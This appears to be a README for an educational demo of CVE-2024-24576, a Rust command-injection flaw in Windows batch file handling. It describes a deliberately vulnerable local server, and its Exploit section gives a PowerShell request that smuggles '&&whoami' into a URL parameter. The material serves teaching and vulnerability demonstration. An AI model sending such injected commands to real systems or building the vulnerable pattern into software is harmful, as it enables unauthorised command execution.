# CVE-2024-24576 BadBatBut Demo

This is a simple demo for the BadBatBut vulnerability CVE-2024-24576.

More information here - https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html.

This repository is for educational purposes only.

## Usage

### Pre-built binary
- Get the pre-built windows binary from the [releases](https://github.com/corysabol/batbadbut-demo/releases).
- Run the server binary `./badbatbut-demo.exe`

### Build from source
- Clone this repo
- Run the code on a Windows box `cargo run`

### Exploit

The server exposes an endpoint `/server_info/{server}` on `http://localhost:9999` which runs a .bat file to fetch server info.
The vulnerability can be exploited by sending a GET request to this endpoint like follows:

```
Write-Output (Invoke-WebRequest -Uri "http://localhost:9999/server_info/localhost&&whoami").Content
```
